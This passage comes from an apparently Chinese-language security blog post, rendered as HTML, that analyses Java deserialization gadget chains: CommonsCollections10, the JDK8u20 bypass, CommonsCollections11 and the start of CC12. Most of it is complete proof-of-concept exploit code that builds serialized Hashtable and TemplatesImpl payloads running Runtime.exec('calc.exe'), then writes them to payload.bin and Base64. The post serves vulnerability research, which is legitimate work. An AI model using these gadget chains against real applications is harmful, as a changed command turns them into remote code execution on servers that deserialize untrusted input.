    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> <span class="hljs-title">hash</span><span class="hljs-params">(Object k)</span> </span>{
        <span class="hljs-keyword">if</span> (useAltHashing) {
            <span class="hljs-keyword">if</span> (k.getClass() == String.class) {
                <span class="hljs-keyword">return</span> sun.misc.Hashing.stringHash32((String) k);
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-comment">// &#x6B64;&#x5904;&#x8C03;&#x7528;hashCode</span>
                <span class="hljs-keyword">int</span> h = hashSeed ^ k.hashCode();

                <span class="hljs-comment">// This function ensures that hashCodes that differ only by</span>
                <span class="hljs-comment">// constant multiples at each bit position have a bounded</span>
                <span class="hljs-comment">// number of collisions (approximately 8 at default load factor).</span>
                h ^= (h &gt;&gt;&gt; <span class="hljs-number">20</span>) ^ (h &gt;&gt;&gt; <span class="hljs-number">12</span>);
                <span class="hljs-keyword">return</span> h ^ (h &gt;&gt;&gt; <span class="hljs-number">7</span>) ^ (h &gt;&gt;&gt; <span class="hljs-number">4</span>);
             }
        } <span class="hljs-keyword">else</span>  {
            <span class="hljs-keyword">return</span> k.hashCode();
        }
    }
</code></pre>
<p>&#x5982;&#x679C;key&#x503C;&#x88AB;&#x4EE3;&#x66FF;&#x4E3A;<code>TiedMapEntry</code>&#x5BF9;&#x8C61;, &#x8FD9;&#x91CC;&#x5C31;&#x80FD;&#x89E6;&#x53D1;<code>LazyMap.get</code></p>
<p>POC</p>
<pre><code class="lang-java"><span class="hljs-keyword">package</span> CommonsCollections;

<span class="hljs-keyword">import</span> org.apache.commons.codec.binary.Base64;
<span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;
<span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;

<span class="hljs-keyword">import</span> java.io.*;
<span class="hljs-keyword">import</span> java.lang.reflect.Field;
<span class="hljs-keyword">import</span> java.util.HashMap;
<span class="hljs-keyword">import</span> java.util.Hashtable;
<span class="hljs-keyword">import</span> java.util.Map;

<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CommonsCollections10</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>{
        <span class="hljs-comment">/**&#x4E0D;&#x80FD;&#x52A0; new ConstantTransformer(1) &#x4F1A;&#x5F71;&#x54CD;payload&#x89E6;&#x53D1;*/</span>
        Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> Transformer[] {<span class="hljs-comment">/*new ConstantTransformer(1)*/</span>};
        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]{
            <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),
            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]{String.class, Class[].class}, <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]}),
            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]{Object.class, Object[].class}, <span class="hljs-keyword">new</span> Object[]{<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]}),
            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]{String.class}, <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;calc.exe&quot;</span>}),
            <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)
        };
        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(fakeTransformers);

        Map innerMap = <span class="hljs-keyword">new</span> HashMap();
        <span class="hljs-comment">// &#x8C03;&#x7528;decorate&#x4E3B;&#x8981;&#x662F;&#x76F4;&#x63A5;&#x5199;&#x5165;&#x7684;&#x65B9;&#x6CD5;&#x662F;protected, &#x9700;&#x8981;&#x8BBE;&#x7F6E;&#x6743;&#x9650;&#x624D;&#x884C;, &#x800C;&#x8BE5;&#x65B9;&#x6CD5;&#x662F;public</span>
        Map outerMap = LazyMap.decorate(innerMap, chainedTransformer);
        TiedMapEntry tiedMapEntry1 = <span class="hljs-keyword">new</span> TiedMapEntry(outerMap, <span class="hljs-string">&quot;keykey&quot;</span>);

        <span class="hljs-comment">// Use the colliding Maps as keys in Hashtable</span>
        Hashtable hashtable = <span class="hljs-keyword">new</span> Hashtable();
        hashtable.put(<span class="hljs-string">&quot;keykey&quot;</span>, <span class="hljs-number">1</span>);

        <span class="hljs-comment">// &#x83B7;&#x53D6;hashtable&#x7684;table&#x7C7B;&#x5C5E;&#x6027;</span>
        Field tableField = Hashtable.class.getDeclaredField(<span class="hljs-string">&quot;table&quot;</span>);
        tableField.setAccessible(<span class="hljs-keyword">true</span>);
        Object[] table = (Object[])tableField.get(hashtable);
        Object tiedMapEntry2 = table[<span class="hljs-number">0</span>];
        <span class="hljs-keyword">if</span>(tiedMapEntry2 == <span class="hljs-keyword">null</span>)
            tiedMapEntry2 = table[<span class="hljs-number">1</span>];
        <span class="hljs-comment">// &#x83B7;&#x53D6;Hashtable.Entry&#x7684;key&#x5C5E;&#x6027;</span>
        Field keyField = tiedMapEntry2.getClass().getDeclaredField(<span class="hljs-string">&quot;key&quot;</span>);
        keyField.setAccessible(<span class="hljs-keyword">true</span>);
        <span class="hljs-comment">// &#x5C06;key&#x5C5E;&#x6027;&#x7ED9;&#x66FF;&#x6362;&#x6210;&#x6784;&#x9020;&#x597D;&#x7684;TiedMapEntry&#x5B9E;&#x4F8B;</span>
        keyField.set(tiedMapEntry2, tiedMapEntry1);

        <span class="hljs-comment">//&#x901A;&#x8FC7;&#x53CD;&#x5C04;&#x8986;&#x76D6;&#x539F;&#x672C;&#x7684;iTransformers&#xFF0C;&#x9632;&#x6B62;&#x5E8F;&#x5217;&#x5316;&#x65F6;&#x5728;&#x672C;&#x5730;&#x6267;&#x884C;&#x547D;&#x4EE4;</span>
        Field f = chainedTransformer.getClass().getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);
        f.setAccessible(<span class="hljs-keyword">true</span>);
        f.set(chainedTransformer, transformers);

        <span class="hljs-comment">// &#x5B57;&#x8282;&#x8C03;&#x7528;&#x5199;&#x6CD5;</span>
        ByteArrayOutputStream barr = <span class="hljs-keyword">new</span> ByteArrayOutputStream();
        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(barr);
        oos.writeObject(hashtable);
        oos.close();
        System.out.println(Base64.encodeBase64String(barr.toByteArray()));
        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(barr.toByteArray()));
        ois.readObject();

        <span class="hljs-comment">// &#x5199;&#x6587;&#x4EF6;&#x5199;&#x6CD5;</span>
        FileOutputStream fileOutputStream = <span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;payload.bin&quot;</span>);
        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(hashtable);
        objectOutputStream.flush();
        objectOutputStream.close();
        FileInputStream fileInputStream = <span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;payload.bin&quot;</span>);
        ObjectInputStream objectInputStream = <span class="hljs-keyword">new</span> ObjectInputStream(fileInputStream);
        objectInputStream.readObject();
    }
}
</code></pre>
<h2 id="jdk8u20">JDK8u20</h2>
<p>&#x53C2;&#x8003;:</p>
<ul>
<li><a href="https://www.cnpanda.net/sec/974.html" target="_blank">https://www.cnpanda.net/sec/974.html</a></li>
<li><a href="https://www.anquanke.com/post/id/87270" target="_blank">https://www.anquanke.com/post/id/87270</a></li>
<li><a href="https://blog.csdn.net/xiaoWhite_meng/article/details/80980145" target="_blank">https://blog.csdn.net/xiaoWhite_meng/article/details/80980145</a></li>
</ul>
<p>&#x5B98;&#x65B9;&#x5BF9;jdk7u21&#x7684;&#x4FEE;&#x590D;</p>
<pre><code class="lang-java"><span class="hljs-comment">// &#x6539;&#x4E4B;&#x524D;</span>
        AnnotationType annotationType = <span class="hljs-keyword">null</span>;
        <span class="hljs-keyword">try</span> {
            annotationType = AnnotationType.getInstance(type);
        } <span class="hljs-keyword">catch</span>(IllegalArgumentException e) {
            <span class="hljs-comment">// Class is no longer an annotation type; all bets are off</span>
           <span class="hljs-keyword">return</span>;
        }

<span class="hljs-comment">// &#x6539;&#x4E4B;&#x540E;</span>
        AnnotationType annotationType = <span class="hljs-keyword">null</span>;
        <span class="hljs-keyword">try</span> {
            annotationType = AnnotationType.getInstance(type);
        } <span class="hljs-keyword">catch</span>(IllegalArgumentException e) {
            <span class="hljs-comment">// Class is no longer an annotation type; time to punch out</span>
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> java.io.InvalidObjectException(<span class="hljs-string">&quot;Non-annotation type in annotation serial stream&quot;</span>);
        }
</code></pre>
<p>&#x8FD9;&#x91CC;&#x589E;&#x52A0;&#x4E86;&#x4E00;&#x6B65;&#x5BF9;type&#x5B57;&#x6BB5;&#x7C7B;&#x578B;&#x7684;&#x68C0;&#x67E5;&#xFF0C;&#x5982;&#x679C;&#x4F20;&#x5165;&#x7684;&#x7C7B;&#x578B;&#x4E0D;&#x662F;AnnotationType&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x4F1A;&#x629B;&#x51FA;&#x4E00;&#x4E2A;&#x5F02;&#x5E38;&#xFF0C;&#x9000;&#x51FA;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6D41;&#x7A0B;&#x3002;&#x7136;&#x800C;&#x6211;&#x4EEC;&#x5728;&#x6784;&#x9020;payload&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5C06;type&#x8D4B;&#x503C;&#x4E3A;Templates.class&#xFF0C;&#x81EA;&#x7136;&#x662F;&#x8FC7;&#x4E0D;&#x4E86;&#x8FD9;&#x4E2A;&#x68C0;&#x67E5;&#xFF0C;&#x6240;&#x4EE5;JDK7u21&#x4E5F;&#x5C31;&#x65E0;&#x6CD5;&#x5728;&#x540E;&#x7EED;&#x7684;Java&#x7248;&#x672C;&#x4E0A;&#x4F7F;&#x7528;&#x4E86; </p>
<p> &#x5B9E;&#x9645;&#x4E0A;&#x5728;<code>jdk7u21</code>&#x6F0F;&#x6D1E;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x4F20;&#x5165;&#x7684;<code>AnnotationInvocationHandler</code>&#x5BF9;&#x8C61;&#x5728;&#x5F02;&#x5E38;&#x88AB;&#x629B;&#x51FA;&#x524D;&#xFF0C;&#x5DF2;&#x7ECF;&#x4ECE;&#x5E8F;&#x5217;&#x5316;&#x6570;&#x636E;&#x4E2D;&#x88AB;&#x8FD8;&#x539F;&#x51FA;&#x6765;&#x3002;&#x6362;&#x53E5;&#x8BDD;&#x8BF4;&#x5C31;&#x662F;&#x6211;&#x4EEC;&#x628A;&#x6076;&#x610F;&#x7684;&#x79CD;&#x5B50;&#x79CD;&#x5230;&#x4E86;&#x8FD0;&#x884C;&#x5BF9;&#x8C61;&#x4E2D;&#xFF0C;&#x4F46;&#x662F;&#x56E0;&#x4E3A;&#x51FA;&#x73B0;&#x5F02;&#x5E38;&#x5BFC;&#x81F4;&#x8BE5;&#x79CD;&#x5B50;&#x6CA1;&#x6CD5;&#x751F;&#x957F;&#xFF0C;&#x53EA;&#x8981;&#x6211;&#x4EEC;&#x89E3;&#x51B3;&#x4E86;&#x8FD9;&#x4E2A;&#x5F02;&#x5E38;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x53EF;&#x4EE5;&#x91CD;&#x65B0;&#x8FBE;&#x5230;&#x6211;&#x4EEC;&#x7684;&#x76EE;&#x7684;</p>
<p>&#x901A;&#x8FC7;&#x5728;JDK7u21&#x7684;proxy&#x5BF9;&#x8C61;&#xFF08;LinkedHashSet&#x7684;&#x7B2C;&#x4E8C;&#x4E2A;&#x6570;&#x636E;&#xFF09;&#x4E2D;&#x63D2;&#x5165;&#x4E00;&#x4E2A;&#x5047;&#x7684;&#x6210;&#x5458;&#xFF0C;&#x4F7F;&#x5176;&#x4E3A;BeanContextSupport&#x7684;&#x5BF9;&#x8C61;&#xFF0C;&#x5728;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x65F6;&#x5019;&#x8FD9;&#x4E2A;&#x6570;&#x636E;&#x4F1A;&#x88AB;&#x629B;&#x5F03;&#x6389;&#xFF0C;&#x56E0;&#x4E3A;&#x5B9E;&#x9645;&#x4E0A;&#x7C7B;&#x7684;&#x5B9A;&#x4E49;&#x4E2D;&#x5E76;&#x6CA1;&#x6709;&#x8FD9;&#x4E48;&#x4E00;&#x4E2A;&#x6210;&#x5458;&#xFF0C;&#x4F46;&#x662F;&#x8BE5;&#x5BF9;&#x8C61;&#x4F9D;&#x7136;&#x4F1A;&#x88AB;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5E76;&#x4E14;&#x4E3A;&#x5176;&#x5206;&#x914D;handle&#xFF0C;&#x90A3;&#x4E48;&#x5728;BeanContextSupport&#x7684;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x524D;&#x9762;&#x63D0;&#x5230;&#x7684;try&#x2026;catch&#x2026;&#x7ED3;&#x6784;&#x987A;&#x5229;&#x7684;&#x8FD8;&#x539F;&#x51FA;AnnotationInvocationHandler&#x5BF9;&#x8C61;&#xFF0C;&#x5E76;&#x4E14;&#x901A;&#x8FC7;&#x6784;&#x9020;&#x5E8F;&#x5217;&#x5316;&#x6570;&#x636E;&#x5B8C;&#x6210;&#x6574;&#x4E2A;&#x5E8F;&#x5217;&#x5316;&#x6D41;&#x7A0B;</p>
<pre><code class="lang-java"><span class="hljs-comment">// readObject</span>
    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(ObjectInputStream ois)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>{

        <span class="hljs-keyword">synchronized</span>(BeanContext.globalHierarchyLock) {
            ois.defaultReadObject();

            initialize();

            bcsPreDeserializationHook(ois);

            <span class="hljs-keyword">if</span> (serializable &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-keyword">this</span>.equals(getBeanContextPeer()))
                readChildren(ois);

            deserialize(ois, bcmListeners = <span class="hljs-keyword">new</span> ArrayList(<span class="hljs-number">1</span>));
        }
    }

<span class="hljs-comment">// readChildren</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readChildren</span><span class="hljs-params">(ObjectInputStream ois)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>{
        <span class="hljs-keyword">int</span> count = serializable;

        <span class="hljs-keyword">while</span> (count-- &gt; <span class="hljs-number">0</span>) {
            Object                      child = <span class="hljs-keyword">null</span>;
            BeanContextSupport.BCSChild bscc  = <span class="hljs-keyword">null</span>;

            <span class="hljs-keyword">try</span> {
                child = ois.readObject();
                bscc  = (BeanContextSupport.BCSChild)ois.readObject();
            } <span class="hljs-keyword">catch</span> (IOException ioe) {
                <span class="hljs-keyword">continue</span>;
            } <span class="hljs-keyword">catch</span> (ClassNotFoundException cnfe) {
                <span class="hljs-keyword">continue</span>;
            }


            <span class="hljs-keyword">synchronized</span>(child) {
                BeanContextChild bcc = <span class="hljs-keyword">null</span>;

                <span class="hljs-keyword">try</span> {
                    bcc = (BeanContextChild)child;
                } <span class="hljs-keyword">catch</span> (ClassCastException cce) {
                    <span class="hljs-comment">// do nothing;</span>
                }

                <span class="hljs-keyword">if</span> (bcc != <span class="hljs-keyword">null</span>) {
                    <span class="hljs-keyword">try</span> {
                        bcc.setBeanContext(getBeanContextPeer());

                       bcc.addPropertyChangeListener(<span class="hljs-string">&quot;beanContext&quot;</span>, childPCL);
                       bcc.addVetoableChangeListener(<span class="hljs-string">&quot;beanContext&quot;</span>, childVCL);

                    } <span class="hljs-keyword">catch</span> (PropertyVetoException pve) {
                        <span class="hljs-keyword">continue</span>;
                    }
                }

                childDeserializedHook(child, bscc);
            }
        }
    }
</code></pre>
<p>&#x5728;&#x6784;&#x9020;&#x4E0A;&#x9700;&#x8981;&#x5BF9;&#x5176;&#x5E8F;&#x5217;&#x5316;&#x751F;&#x6210;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x5206;&#x6790;, &#x6BD4;&#x8F83;&#x590D;&#x6742;, &#x53C2;&#x8003;&#x5E08;&#x5085;&#x4EEC;&#x7684;payload:  <a href="https://github.com/pwntester/JRE8u20_RCE_Gadget" target="_blank">https://github.com/pwntester/JRE8u20_RCE_Gadget</a></p>
<h2 id="cc11mixed-with-cc2-and-cc6">CC11_mixed with CC2 and CC6</h2>
<p>CommonsCollections11&#x4E3B;&#x8981;&#x662F;&#x901A;&#x8FC7;InvokerTransformer&#x53BB;&#x8C03;&#x7528;TemplatesInmpl&#x7684;newTransformer</p>
<p>POC</p>
<pre><code class="lang-java"><span class="hljs-keyword">package</span> CommonsCollections;

<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
<span class="hljs-keyword">import</span> javassist.ClassClassPath;
<span class="hljs-keyword">import</span> javassist.ClassPool;
<span class="hljs-keyword">import</span> javassist.CtClass;
<span class="hljs-keyword">import</span> org.apache.commons.codec.binary.Base64;
<span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;
<span class="hljs-keyword">import</span> org.apache.commons.collections.map.DefaultedMap;

<span class="hljs-keyword">import</span> java.io.*;
<span class="hljs-keyword">import</span> java.lang.reflect.Field;
<span class="hljs-keyword">import</span> java.util.HashMap;
<span class="hljs-keyword">import</span> java.util.Map;

<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CommonsCollections11</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>{
        <span class="hljs-comment">// ClassPool&#x662F; CtClass &#x5BF9;&#x8C61;&#x7684;&#x5BB9;&#x5668;&#x3002;&#x5B9E;&#x4F8B;&#x5316;&#x4E00;&#x4E2A;ClassPool&#x5BB9;&#x5668;&#x3002;</span>
        ClassPool classPool = ClassPool.getDefault();
        <span class="hljs-comment">// &#x5411;&#x5BB9;&#x5668;&#x4E2D;&#x7684;&#x7C7B;&#x641C;&#x7D22;&#x8DEF;&#x5F84;&#x7684;&#x8D77;&#x59CB;&#x4F4D;&#x7F6E;&#x63D2;&#x5165;AbstractTranslet.class&#xFF0C;&#x4E2A;&#x4EBA;&#x8BA4;&#x4E3A;&#x662F;&#x65B9;&#x4FBF;&#x8BA9;&#x540E;&#x9762;&#x80FD;&#x591F;&#x627E;&#x5230;&#x8FD9;&#x4E2A;&#x7C7B;</span>
        classPool.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));
        <span class="hljs-comment">// &#x4F7F;&#x7528;&#x5BB9;&#x5668;&#x65B0;&#x5EFA;&#x4E00;&#x4E2A;CtClass&#xFF0C;&#x76F8;&#x5F53;&#x4E8E;&#x65B0;&#x5EFA;&#x4E00;&#x4E2A;class&#xFF0C;&#x7C7B;&#x540D;&#x4E3A;Evil</span>
        CtClass ctClass = classPool.makeClass(<span class="hljs-string">&quot;Evil&quot;</span>);
        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;%s\&quot;);&quot;</span>;
        cmd = String.format(cmd, <span class="hljs-string">&quot;calc.exe&quot;</span>);
        <span class="hljs-comment">// &#x7ED9;&#x8FD9;&#x4E2A;&#x7C7B;&#x521B;&#x5EFA; static &#x4EE3;&#x7801;&#x5757;&#xFF0C;&#x5E76;&#x63D2;&#x5165;&#x5230;&#x7C7B;&#x4E2D;</span>
        ctClass.makeClassInitializer().insertBefore(cmd);
        String className = <span class="hljs-string">&quot;Evil&quot;</span> + System.nanoTime();
        <span class="hljs-comment">// &#x91CD;&#x65B0;&#x8BBE;&#x7F6E;&#x7C7B;&#x540D;&#x4E3A;&#x4E00;&#x4E2A;&#x968F;&#x673A;&#x7684;&#x540D;&#x5B57;</span>
        ctClass.setName(className);
        <span class="hljs-comment">// &#x7ED9;&#x8FD9;&#x4E2A;&#x7C7B;&#x6DFB;&#x52A0;&#x4E00;&#x4E2A;&#x7236;&#x7C7B;&#xFF0C;&#x5373;&#x7EE7;&#x627F;&#x8BE5;&#x7236;&#x7C7B;&#x3002;</span>
        ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName())); <span class="hljs-comment">// &#x8BBE;&#x7F6E;&#x7236;&#x7C7B;&#x4E3A;AbstractTranslet&#xFF0C;&#x907F;&#x514D;&#x62A5;&#x9519;</span>
        <span class="hljs-comment">// &#x5C06;&#x8FD9;&#x4E2A;&#x7C7B;&#x8F93;&#x51FA;&#x5230;&#x9879;&#x76EE;&#x76EE;&#x5F55;&#x4E0B;</span>
<span class="hljs-comment">//        ctClass.writeFile(&quot;./&quot;);</span>
        <span class="hljs-comment">// &#x5C06;&#x8FD9;&#x4E2A;class&#x8F6C;&#x6362;&#x4E3A;&#x5B57;&#x8282;&#x6570;&#x7EC4;</span>
        <span class="hljs-keyword">byte</span>[] classBytes = ctClass.toBytecode();
        <span class="hljs-comment">// &#x5C06;&#x5B57;&#x8282;&#x6570;&#x7EC4;&#x653E;&#x7F6E;&#x5230;&#x4E00;&#x4E2A;&#x4E8C;&#x7EF4;&#x6570;&#x7EC4;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x5143;&#x7D20;</span>
        <span class="hljs-keyword">byte</span>[][] targetByteCodes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]{classBytes};
        <span class="hljs-comment">// &#x5B9E;&#x4F8B;&#x5316;TemplatesImpl&#x5BF9;&#x8C61;</span>
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        <span class="hljs-comment">// &#x901A;&#x8FC7;&#x53CD;&#x5C04;&#x8BBE;&#x7F6E;&#x5B57;&#x6BB5;&#x7684;&#x503C;&#x4E3A;&#x4E8C;&#x7EF4;&#x5B57;&#x8282;&#x6570;&#x7EC4;</span>
        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, targetByteCodes);
        <span class="hljs-comment">// &#x8FDB;&#x5165; defineTransletClasses() &#x65B9;&#x6CD5;&#x9700;&#x8981;&#x7684;&#x6761;&#x4EF6;</span>
        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;name&quot;</span>);
        setFieldValue(templates, <span class="hljs-string">&quot;_class&quot;</span>, <span class="hljs-keyword">null</span>);

        Transformer transformer = <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getClass&quot;</span>, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>);

        Map innerMap = <span class="hljs-keyword">new</span> HashMap();
<span class="hljs-comment">//        Map outerMap = LazyMap.decorate(innerMap, transformer);</span>
        Map outerMap = DefaultedMap.decorate(innerMap, transformer);

        TiedMapEntry tiedmapentry = <span class="hljs-keyword">new</span> TiedMapEntry(outerMap, templates);
        Map expMap = <span class="hljs-keyword">new</span> HashMap();
        expMap.put(tiedmapentry, <span class="hljs-string">&quot;valuevalue&quot;</span>);

        <span class="hljs-comment">// &#x6E05;&#x9664;&#x952E;&#x503C;</span>
        outerMap.clear();
        <span class="hljs-comment">// &#x901A;&#x8FC7;&#x53CD;&#x5C04;&#x8986;&#x76D6;&#x539F;&#x672C;&#x7684;iMethodName&#xFF0C;&#x9632;&#x6B62;&#x5E8F;&#x5217;&#x5316;&#x65F6;&#x5728;&#x672C;&#x5730;&#x89E6;&#x53D1;&#x6076;&#x610F;&#x65B9;&#x6CD5;</span>
        setFieldValue(transformer, <span class="hljs-string">&quot;iMethodName&quot;</span>, <span class="hljs-string">&quot;newTransformer&quot;</span>);

        <span class="hljs-comment">// &#x5B57;&#x8282;&#x8C03;&#x7528;&#x5199;&#x6CD5;</span>
        ByteArrayOutputStream barr = <span class="hljs-keyword">new</span> ByteArrayOutputStream();
        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(barr);
        oos.writeObject(expMap);
        oos.close();
        System.out.println(Base64.encodeBase64String(barr.toByteArray()));
        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(barr.toByteArray()));
        ois.readObject();

        <span class="hljs-comment">// &#x5199;&#x6587;&#x4EF6;&#x5199;&#x6CD5;</span>
        FileOutputStream fileOutputStream = <span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;payload.bin&quot;</span>);
        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(expMap);
        objectOutputStream.flush();
        objectOutputStream.close();
        FileInputStream fileInputStream = <span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;payload.bin&quot;</span>);
        ObjectInputStream objectInputStream = <span class="hljs-keyword">new</span> ObjectInputStream(fileInputStream);
        objectInputStream.readObject();
    }

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception </span>{
        <span class="hljs-keyword">final</span> Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> </span>{
        Field field = <span class="hljs-keyword">null</span>;
        <span class="hljs-keyword">try</span> {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(<span class="hljs-keyword">true</span>);
        }
        <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) {
            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-keyword">null</span>)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        <span class="hljs-keyword">return</span> field;
    }
}
</code></pre>
<h2 id="cc12update-by-cc6">CC12_Update by CC6</h2>
<p>&#x53C2;&#x8003;: </p>
<ul>
<li><a href="https://forum.butian.net/share/120" target="_blank">https://forum.butian.net/share/120</a></li>
<li><a href="https://xz.aliyun.com/t/8673" target="_blank">https://xz.aliyun.com/t/8673</a></li>
</ul>
<p>javax.script.ScriptEngineManager &#x5F15;&#x64CE;&#x8C03;&#x7528;</p>
<h3 id="jdk&#x5185;&#x7F6E;&#x7684;js&#x5F15;&#x64CE;">JDK&#x5185;&#x7F6E;&#x7684;JS&#x5F15;&#x64CE;</h3>
<p>&#x79D1;&#x666E;&#x4E00;&#x4E0B;<code>javax.script.ScriptEngineManager</code>.&#x8FD9;&#x4E2A;&#x7C7B;&#x5728;jdk&#x4E2D;&#x53EF;&#x4EE5;&#x7528;&#x4EE5;&#x6267;&#x884C;&#x4E00;&#x4E9B;&#x811A;&#x672C;&#x8BED;&#x8A00;,&#x4F8B;&#x5982;&#x6BD4;&#x8F83;&#x6D41;&#x884C;&#x7684;&#x6709;JavaScript&#x3001;Scala&#x3001;JRuby&#x3001;Jython&#x548C;Groovy&#x7B49;.&#x800C;JavaSE6&#x4E2D;&#x81EA;&#x5E26;&#x4E86;<code>JavaScript</code>&#x8BED;&#x8A00;&#x7684;&#x811A;&#x672C;&#x5F15;&#x64CE;,&#x57FA;&#x4E8E;Mozilla&#x7684;Rhino&#x5B9E;&#x73B0;,&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4E09;&#x79CD;&#x65B9;&#x5F0F;&#x67E5;&#x627E;&#x811A;&#x672C;&#x5F15;&#x64CE;:</p>
<ul>
<li><p>1.&#x901A;&#x8FC7;&#x811A;&#x672C;&#x540D;&#x79F0;&#x83B7;&#x53D6;&#xFF1A;</p>
<pre><code>ScriptEngine engine = new ScriptEngineManager().getEngineByName(&quot;JavaScript&quot;);
</code></pre></li>
<li><p>2.&#x901A;&#x8FC7;MIME&#x7C7B;&#x578B;&#x6765;&#x83B7;&#x53D6;&#xFF1A;</p>
